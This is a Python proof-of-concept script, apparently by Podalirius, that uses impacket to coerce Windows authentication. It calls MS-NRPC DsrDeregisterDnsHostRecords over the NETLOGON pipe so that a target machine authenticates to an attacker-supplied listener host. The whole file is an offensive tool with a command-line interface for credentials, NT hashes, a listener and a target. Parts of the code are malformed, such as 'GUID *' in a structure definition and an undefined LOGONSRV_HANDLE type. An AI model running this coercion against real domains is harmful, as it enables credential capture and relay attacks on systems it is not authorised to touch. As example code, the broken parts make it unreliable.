#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : coerce_poc.py
# Author             : Podalirius (@podalirius_)
# Date created       : 01 July 2022


import sys
import argparse
from impacket import system_errors
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT
from impacket.dcerpc.v5.dtypes import UUID, ULONG, WSTR, DWORD, LONG, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTR, GUID
from impacket.dcerpc.v5.rpcrt import DCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.uuid import uuidtup_to_bin


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'SessionError: unknown error code: 0x%x' % self.error_code


class DsrDeregisterDnsHostRecords(NDRCALL):
    opnum = 41
    structure = (
        ('ServerName', LOGONSRV_HANDLE), # Type: LOGONSRV_HANDLE
        ('DnsDomainName', WSTR), # Type: wchar_t *
        ('DomainGuid', GUID *), # Type: GUID *
        ('DsaGuid', GUID *), # Type: GUID *
        ('DnsHostName', WSTR), # Type: wchar_t *
    )


class DsrDeregisterDnsHostRecordsResponse(NDRCALL):
    structure = ()


class RPCProtocol(object):
    """
    Documentation for class RPCProtocol
    """

    uuid = None
    version = None
    pipe = None

    ncan_target = None
    __rpctransport = None
    dce = None

    def __init__(self):
        super(RPCProtocol, self).__init__()

    def connect(self, username, password, domain, lmhash, nthash, target, dcHost, doKerberos=False, targetIp=None):
        self.ncan_target = r'ncacn_np:%s[%s]' % (target, self.pipe)
        self.__rpctransport = transport.DCERPCTransportFactory(self.ncan_target)

        if hasattr(self.__rpctransport, 'set_credentials'):
            self.__rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash
            )

        if doKerberos == True:
            self.__rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        if targetIp is not None:
            self.__rpctransport.setRemoteHost(targetIp)

        self.dce = self.__rpctransport.get_dce_rpc()
        self.dce.set_auth_type(RPC_C_AUTHN_WINNT)
        self.dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)

        print("[>] Connecting to %s ... " % self.ncan_target, end="")
        sys.stdout.flush()
        try:
            self.dce.connect()
        except Exception as e:
            print("\x1b[1;91mfail\x1b[0m")
            print("[!] Something went wrong, check error status => %s" % str(e))
            return False
        else:
            print("\x1b[1;92msuccess\x1b[0m")

        print("[>] Binding to <uuid='%s', version='%s'> ... " % (self.uuid, self.version), end="")
        sys.stdout.flush()
        try:
            self.dce.bind(uuidtup_to_bin((self.uuid, self.version)))
        except Exception as e:
            print("\x1b[1;91mfail\x1b[0m")
            print("[!] Something went wrong, check error status => %s" % str(e))
            return False
        else:
            print("\x1b[1;92msuccess\x1b[0m")

        return True


class MS_NRPC(RPCProtocol):
    uuid = "12345678-1234-abcd-ef00-01234567cffb"
    version = "1.0"
    pipe = r"\PIPE\NETLOGON"

    def DsrDeregisterDnsHostRecords(self, listener):
        if self.dce is not None:
            print("[>] Calling DsrDeregisterDnsHostRecords() ...")
            try:
                request = DsrDeregisterDnsHostRecords()

            
                request['ServerName'] = '%s\x00' % listener
            

            
                request['DnsDomainName'] = None
            

            
                request['DomainGuid'] = None
            

            
                request['DsaGuid'] = None
            

            
                request['DnsHostName'] = None
            

                # request.dump()
                resp = self.dce.request(request)
            except Exception as e:
                print(e)
        else:
            print("[!] Error: dce is None, you must call connect() first.")


if __name__ == '__main__':
    print("Windows auth coerce using MS-NRPC::DsrDeregisterDnsHostRecords()\n")
    parser = argparse.ArgumentParser(add_help=True, description="Proof of concept for coercing authentication with MS-NRPC::DsrDeregisterDnsHostRecords()")

    parser.add_argument("-u", "--username", default="", help="Username to authenticate to the endpoint.")
    parser.add_argument("-p", "--password", default="", help="Password to authenticate to the endpoint. (if omitted, it will be asked unless -no-pass is specified)")
    parser.add_argument("-d", "--domain", default="", help="Windows domain name to authenticate to the endpoint.")
    parser.add_argument("--hashes", action="store", metavar="[LMHASH]:NTHASH", help="NT/LM hashes (LM hash can be empty)")
    parser.add_argument("--no-pass", action="store_true", help="Don't ask for password (useful for -k)")
    parser.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line")
    parser.add_argument("--dc-ip", action="store", metavar="ip address", help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")
    parser.add_argument("--target-ip", action="store", metavar="ip address", help="IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it")

    parser.add_argument("listener", help="IP address or hostname of listener")
    parser.add_argument("target", help="IP address or hostname of target")

    options = parser.parse_args()

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash, nthash = '', ''

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        from getpass import getpass

        options.password = getpass("Password:")

    protocol = MS_NRPC()

    connected = protocol.connect(
        username=options.username,
        password=options.password,
        domain=options.domain,
        lmhash=lmhash,
        nthash=nthash,
        target=options.target,
        doKerberos=options.kerberos,
        dcHost=options.dc_ip,
        targetIp=options.target_ip
    )

    if connected:
        protocol.DsrDeregisterDnsHostRecords(options.listener)

    sys.exit()